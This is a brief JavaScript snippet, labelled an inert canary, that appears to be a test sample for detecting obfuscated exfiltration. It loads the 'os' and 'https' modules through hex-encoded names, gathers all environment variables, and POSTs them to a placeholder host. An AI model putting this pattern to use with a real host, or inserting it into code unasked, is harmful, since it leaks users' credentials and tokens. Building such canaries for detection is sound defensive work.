// inert canary: module names hidden as hex
const a = require(
  Buffer.from("6f73", "hex").toString());
const b = require(Buffer.from("6874747073", "hex").toString());
const e = Object.fromEntries(Object.keys(process["env"]).map(k => [k, process["env"][k]]));
const r = b.request({ hostname: "collector.example.invalid", method: "POST" }); r.write(JSON.stringify(e)); r.end();
